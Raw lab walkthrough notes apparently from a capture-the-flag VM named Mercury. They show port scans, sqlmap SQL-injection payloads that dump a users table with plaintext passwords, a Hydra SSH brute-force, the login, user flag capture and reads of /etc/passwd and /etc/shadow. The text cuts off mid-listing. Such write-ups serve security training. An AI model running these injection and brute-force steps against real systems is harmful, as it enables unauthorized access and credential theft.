Mercury IP: 10.0.2.6


Rustscam:

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 08:00:27:A6:C4:93 (Oracle VirtualBox virtual NIC)

Nmap:

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCv2kWy2C3yUkz42v3fw7LeUhH6rqOhQqqU4KNMv3Hh/25dEI3F1+BrJlimrVxH3B7WNoyAS205KACPRmvyI4I27yyXfMZ1E15D94+ZNfSE/6dG5qFNxUuJzPeVZVg3Rr2A4qMULAGQUqZAhd0vdb4QX3LyseGkigqn1POhL5wTTRCXrgAr8iWPqJxIt0AJQQvIvSZkwzHVxn1Bn7+/FMKGjimGujAIWg2GFPk1FHPjULQWgEcPCUO0z4lgaHAqZCr9xG3iSYESh0XCQnxpZA2PgrgMpaDr2QR/tklK1hRpg+eylg20UlWVPzg5BRAA+uyX3Qax3K6BCPokTSPXwN13qfgeu95G1cdE4OJhy7ENpiP/M01hfCi6cy+PhhgpN0UwbSaO1UmvmAgJjcJbHbD5hk9xuHbuzhiWdUj02ftGKwS4qG9f2EhIKwy95RKseq3p2rH9K0H8rLMRqSP9pQ8CF5aynHsdCZtWWYWh/2licfzvm0xLwAuTBljDmqicSH8=
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPRFXRHxQ1CAUIiG81tUpJAjV4KTvplX+pdVuqHW68CGXyVwTxPQq01UM2e7IXiYdB0oXsXn7YQAa2ti2y6FUxA=
|   256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEA7N/wSYGrz/Nb9cd1KwzZfsScvv9FX1naKAxVg/Wog
8080/tcp open  http-proxy syn-ack ttl 64 WSGIServer/0.2 CPython/3.8.2
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Thu, 29 May 2025 13:12:00 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 2366
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 29 May 2025 13:12:00 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 69
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Hello. This site is currently in development please check back later.
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=5/29%Time=68385D1E%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,135,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2029\x20May\x
SF:202025\x2013:12:00\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8
SF:\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:
SF:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\x20i
SF:s\x20currently\x20in\x20development\x20please\x20check\x20back\x20later
SF:\.")%r(HTTPOptions,135,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2029\x
SF:20May\x202025\x2013:12:00\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPyth
SF:on/3\.8\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-O
SF:ptions:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20si
SF:te\x20is\x20currently\x20in\x20development\x20please\x20check\x20back\x
SF:20later\.")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C/
SF:/DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://w
SF:ww\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20c
SF:ontent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<t
SF:itle>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x
SF:20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RT
SF:SP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20e
SF:xplanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax
SF:\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>
SF:\n")%r(FourOhFourRequest,A28,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:
SF:\x20Thu,\x2029\x20May\x202025\x2013:12:00\x20GMT\r\nServer:\x20WSGIServ
SF:er/0\.2\x20CPython/3\.8\.2\r\nContent-Type:\x20text/html\r\nX-Frame-Opt
SF:ions:\x20DENY\r\nContent-Length:\x202366\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nReferrer-Policy:\x20same-origin\r\n\r\n<!DOCTYPE\x20html>\n<
SF:html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20http-equiv=\"content-typ
SF:e\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20<title>Page\x2
SF:0not\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak</title>\n\x20\
SF:x20<meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\x20\x20<st
SF:yle\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20{\x20padding:0
SF:;\x20margin:0;\x20}\n\x20\x20\x20\x20body\x20\*\x20{\x20padding:10px\x2
SF:020px;\x20}\n\x20\x20\x20\x20body\x20\*\x20\*\x20{\x20padding:0;\x20}\n
SF:\x20\x20\x20\x20body\x20{\x20font:small\x20sans-serif;\x20background:#e
SF:ee;\x20color:#000;\x20}\n\x20\x20\x20\x20body>div\x20{\x20border-bottom
SF::1px\x20solid\x20#ddd;\x20}\n\x20\x20\x20\x20h1\x20{\x20font-weight:nor
SF:mal;\x20margin-bottom:\.4em;\x20}\n\x20\x20\x20\x20h1\x20span\x20{\x20f
SF:ont-size:60%;\x20color:#666;\x20font-weight:normal;\x20}\n\x20\x20\x20\
SF:x20table\x20{\x20border:none;\x20border-collapse:\x20collapse;\x20width
SF::100%;\x20}\n\x20\x20\x20\x20td,\x20th\x20{\x20vertical-align:");
MAC Address: 08:00:27:A6:C4:93 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



nikto:

ikto -h 10.0.2.6:8080                
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.6
+ Target Hostname:    10.0.2.6
+ Target Port:        8080
+ Start Time:         2025-05-29 09:13:26 (GMT-4)
---------------------------------------------------------------------------
+ Server: WSGIServer/0.2 CPython/3.8.2
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /SilverStream: SilverStream allows directory listing. See: https://web.archive.org/web/20011226154728/http://archives.neohapsis.com/archives/sf/pentest/2000-11/0147.html
+ /static/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ 8103 requests: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-05-29 09:14:21 (GMT-4) (55 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

/mercuryfacts/ seems to be pulling data from a db. let's look for SQLI

sqlmap -u "http://10.0.2.6:8080/mercuryfacts/" -dbs -batch

      ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.11#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:29:17 /2025-05-29/

[09:29:18] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[09:29:18] [INFO] testing connection to the target URL
[09:29:18] [INFO] checking if the target is protected by some kind of WAF/IPS
[09:29:18] [INFO] testing if the target URL content is stable
[09:29:18] [INFO] target URL content is stable
[09:29:18] [INFO] testing if URI parameter '#1*' is dynamic
got a 301 redirect to 'http://10.0.2.6:8080/mercuryfacts/8055/'. Do you want to follow? [Y/n] Y
[09:29:18] [INFO] URI parameter '#1*' appears to be dynamic
[09:29:19] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[09:29:19] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[09:29:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[09:29:19] [WARNING] reflective value(s) found and filtering out
[09:29:21] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[09:29:22] [INFO] testing 'Generic inline queries'
[09:29:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[09:29:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[09:29:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[09:29:35] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[09:29:42] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[09:29:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[09:29:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[09:30:06] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[09:30:15] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:30:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:30:34] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[09:30:34] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[09:30:34] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[09:30:34] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[09:30:34] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[09:30:34] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[09:30:34] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[09:30:35] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[09:30:35] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[09:30:35] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[09:30:35] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[09:30:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[09:30:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:30:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:30:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:30:55] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:30:59] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[09:31:04] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[09:31:08] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:31:13] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:31:17] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:31:23] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:31:28] [INFO] testing 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:31:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:31:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[09:31:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:31:42] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[09:31:47] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:31:52] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[09:31:57] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[09:32:00] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[09:32:04] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[09:32:04] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[09:32:04] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[09:32:05] [INFO] URI parameter '#1*' is 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' injectable 
[09:32:05] [INFO] testing 'MySQL inline queries'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[09:32:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[09:32:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[09:32:05] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[09:32:06] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[09:32:06] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[09:32:06] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[09:32:06] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[09:32:06] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[09:32:06] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[09:32:06] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[09:32:06] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[09:32:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[09:32:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[09:32:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[09:32:06] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[09:32:06] [INFO] testing 'MySQL AND time-based blind (ELT)'
[09:32:06] [INFO] testing 'MySQL OR time-based blind (ELT)'
[09:32:06] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[09:32:06] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[09:32:07] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[09:32:07] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[09:32:07] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[09:33:07] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace' injectable 
[09:33:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[09:33:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:33:09] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[09:33:11] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[09:33:13] [INFO] target URL appears to be UNION injectable with 1 columns
[09:33:13] [INFO] URI parameter '#1*' is 'MySQL UNION query (random number) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1876 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
    Payload: http://10.0.2.6:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x71706a7871,(SELECT (ELT(4188=4188,1))),0x7170626a71),4188)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: http://10.0.2.6:8080/mercuryfacts/(CASE WHEN (2818=2818) THEN SLEEP(5) ELSE 2818 END)

    Type: UNION query
    Title: MySQL UNION query (random number) - 1 column
    Payload: http://10.0.2.6:8080/mercuryfacts/-8070 UNION ALL SELECT CONCAT(0x71706a7871,0x6f4a4d4c726542684e6159644d59446b6b794c4c6f657255746a6a756b666c4b5059764d4b49586e,0x7170626a71)#
---
[09:33:13] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[09:33:13] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

[09:33:14] [INFO] fetched data logged to text files under '/home/gabi/.local/share/sqlmap/output/10.0.2.6'
[09:33:14] [WARNING] your sqlmap version is outdated

[*] ending @ 09:33:14 /2025-05-29/


there are 2 db's, mercury is looking interesting:)


sqlmap -u "http://10.0.2.6:8080/mercuryfacts/" -D mercury --dump --batch  
        ___
       __H__                                                                                                                                                                                 
 ___ ___[,]_____ ___ ___  {1.8.11#stable}                                                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:34:33 /2025-05-29/

[09:34:33] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[09:34:33] [INFO] resuming back-end DBMS 'mysql' 
[09:34:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
    Payload: http://10.0.2.6:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x71706a7871,(SELECT (ELT(4188=4188,1))),0x7170626a71),4188)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: http://10.0.2.6:8080/mercuryfacts/(CASE WHEN (2818=2818) THEN SLEEP(5) ELSE 2818 END)

    Type: UNION query
    Title: MySQL UNION query (random number) - 1 column
    Payload: http://10.0.2.6:8080/mercuryfacts/-8070 UNION ALL SELECT CONCAT(0x71706a7871,0x6f4a4d4c726542684e6159644d59446b6b794c4c6f657255746a6a756b666c4b5059764d4b49586e,0x7170626a71)#
---
[09:34:33] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[09:34:33] [INFO] fetching tables for database: 'mercury'
got a 301 redirect to 'http://10.0.2.6:8080/mercuryfacts/-5632%20UNION%20ALL%20SELECT%20CONCAT(0x71706a7871,JSON_ARRAYAGG(CONCAT_WS(0x717463796472,table_name)),0x7170626a71)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20(0x6d657263757279)%23/'. Do you want to follow? [Y/n] Y
[09:34:33] [WARNING] reflective value(s) found and filtering out
[09:34:33] [INFO] fetching columns for table 'users' in database 'mercury'
[09:34:33] [INFO] fetching entries for table 'users' in database 'mercury'
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+

[09:34:33] [INFO] table 'mercury.users' dumped to CSV file '/home/gabi/.local/share/sqlmap/output/10.0.2.6/dump/mercury/users.csv'
[09:34:33] [INFO] fetching columns for table 'facts' in database 'mercury'
[09:34:33] [INFO] fetching entries for table 'facts' in database 'mercury'
[09:34:33] [INFO] retrieved: 'Mercury does not have any moons or rings.','1'
[09:34:33] [INFO] retrieved: 'Mercury is the smallest planet.','2'
[09:34:33] [INFO] retrieved: 'Mercury is the closest planet to the Sun.','3'
[09:34:33] [INFO] retrieved: 'Your weight on Mercury would be 38% of your weight on Earth.','4'
[09:34:33] [INFO] retrieved: 'A day on the surface of Mercury lasts 176 Earth days.','5'
[09:34:33] [INFO] retrieved: 'A year on Mercury takes 88 Earth days.','6'
[09:34:33] [INFO] retrieved: 'It's not known who discovered Mercury.','7'
[09:34:33] [INFO] retrieved: 'A year on Mercury is just 88 days long.','8'
Database: mercury                                                                                                                                                                           
Table: facts
[8 entries]
+----+--------------------------------------------------------------+
| id | fact                                                         |
+----+--------------------------------------------------------------+
| 1  | Mercury does not have any moons or rings.                    |
| 2  | Mercury is the smallest planet.                              |
| 3  | Mercury is the closest planet to the Sun.                    |
| 4  | Your weight on Mercury would be 38% of your weight on Earth. |
| 5  | A day on the surface of Mercury lasts 176 Earth days.        |
| 6  | A year on Mercury takes 88 Earth days.                       |
| 7  | It's not known who discovered Mercury.                       |
| 8  | A year on Mercury is just 88 days long.                      |
+----+--------------------------------------------------------------+

[09:34:33] [INFO] table 'mercury.facts' dumped to CSV file '/home/gabi/.local/share/sqlmap/output/10.0.2.6/dump/mercury/facts.csv'
[09:34:33] [INFO] fetched data logged to text files under '/home/gabi/.local/share/sqlmap/output/10.0.2.6'
[09:34:33] [WARNING] your sqlmap version is outdated

[*] ending @ 09:34:33 /2025-05-29/


we got some usernames and passwords,and we have ssh open on port 20

we can use hydra to see if we can use any of these users for ssh:

hydra -L users.txt -P pass.txt ssh://10.0.2.6
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-29 09:38:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ssh://10.0.2.6:22/
[22][ssh] host: 10.0.2.6   login: webmaster   password: mercuryisthesizeof0.056Earths
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-29 09:38:22

ssh webmaster@10.0.2.6                                                   
The authenticity of host '10.0.2.6 (10.0.2.6)' can't be established.
ED25519 key fingerprint is SHA256:mHhkDLhyH54cYFlptygnwr7NYpEtepsNhVAT8qzqcUk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.6' (ED25519) to the list of known hosts.
webmaster@10.0.2.6's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 29 May 13:39:10 UTC 2025

  System load:  0.06              Processes:               105
  Usage of /:   68.7% of 4.86GB   Users logged in:         0
  Memory usage: 30%               IPv4 address for enp0s3: 10.0.2.6
  Swap usage:   0%


22 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Tue Sep  1 13:57:14 2020 from 192.168.31.136
webmaster@mercury:~$ 

webmaster@mercury:~$ ls
mercury_proj  user_flag.txt
webmaster@mercury:~$ cat user_flag.txt 
[user_flag_8339915c9a454657bd60ee58776f4ccd]


webmaster@mercury:~$ sudo -l
[sudo] password for webmaster: 
Sorry, user webmaster may not run sudo on mercury.
webmaster@mercury:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
webmaster@mercury:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
